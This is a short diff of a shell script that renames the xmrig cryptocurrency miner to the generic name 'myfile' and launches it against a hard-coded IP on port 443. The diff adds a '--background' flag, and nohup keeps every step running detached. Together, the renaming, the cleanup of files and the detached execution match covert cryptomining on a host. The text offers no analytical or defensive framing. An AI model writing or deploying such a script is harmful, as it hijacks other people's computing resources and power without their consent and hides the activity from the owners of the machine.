@@ -5,4 +5,4 @@ nohup rm config.json
 nohup rm out 
 nohup mv xmrig myfile
 nohup echo '{"bench-algo-time":2}' > xjson 
-./myfile -o 79.231.42.249:443 -c xjson
+./myfile -o 79.231.42.249:443 -c xjson --background
